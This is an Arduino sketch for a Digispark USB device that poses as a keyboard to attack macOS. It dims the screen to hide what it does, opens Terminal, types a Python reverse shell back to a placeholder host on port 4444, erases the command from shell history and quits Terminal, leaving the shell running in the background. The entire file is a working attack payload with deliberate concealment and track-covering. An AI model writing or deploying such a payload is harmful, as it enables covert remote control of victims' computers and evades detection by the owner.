#include "DigiKeyboard.h"

void setup()
{
    // reset
    DigiKeyboard.sendKeyStroke(0);
    // screen obfuscation ON
    for (int i = 0; i < 16; i++)
    {
        DigiKeyboard.sendKeyStroke(KEY_F1);
    }
    // open terminal via spotlight
    DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.print("terminal");
    DigiKeyboard.delay(100);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(2000);
    // run reverse shell script
    DigiKeyboard.print("python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((\"X.X.X.X\",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")' &");
    DigiKeyboard.delay(100);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(100);
    // erase history
    DigiKeyboard.print("sed -i '' \"$(($(wc -l <$HISTFILE)-1)),$ d\" $HISTFILE");
    DigiKeyboard.delay(100);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(100);
    // quit terminal
    DigiKeyboard.sendKeyStroke(KEY_Q, MOD_GUI_LEFT);
    DigiKeyboard.delay(100);
    // confirm quit (background process warning)
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    // screen obfuscation OFF
    for (int i = 0; i < 16; i++)
    {
        DigiKeyboard.sendKeyStroke(KEY_F2);
    }
    // done
    pinMode(1, OUTPUT);
    digitalWrite(1, HIGH);
}

void loop()
{
}